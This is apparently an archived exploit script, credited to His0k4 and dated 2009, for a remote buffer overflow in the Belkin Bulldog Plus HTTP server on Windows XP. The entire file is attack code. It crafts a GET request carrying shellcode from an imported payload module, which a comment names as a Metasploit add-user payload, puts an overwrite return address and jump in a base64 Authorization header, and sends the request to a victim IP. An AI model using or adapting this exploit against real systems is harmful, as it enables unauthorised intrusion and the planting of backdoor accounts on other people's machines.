#!/usr/bin/python
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[*] Usage   : belkin.py [victime_ip]
#[*] Bug     : Belkin Bulldog Plus HTTP Server Remote Buffer Overflow Exploit
#[*] Credits go to : Elazar Broad
#[*] Tested on :    Xp sp3 (EN)(VB)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ),snakespc.com
#[*] Chabiba wa sayd el ba7ri :D

import sys, socket
import base64
import socket
from payload import buf
import sys
def shell_attack(target_machine, target_port):

    host = target_machine
    port = target_port

    # win32_adduser -  PASS=27 EXITFUNC=seh USER=DZ Size=477 Encoder=PexAlphaNum http://metasploit.com
    

    jump=b"\xFF\x54\x24\x58" #Jump to the GET request wich contains our shellcode.

    ret=b"\xFF\x17\x49\x7E" #Friendly jmp esp "user32.dll".

    junk = b"\x41"*16

    exploit1 = base64.encodestring(ret + jump + junk)
    exploit2 = buf

    head =  b'GET '+exploit2+b' HTTP/1.1\r\n'
    head += b'Authorization: Basic '+exploit1+b'\r\n\r\n'

    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(head)

    # milw0rm.com [2009-04-27]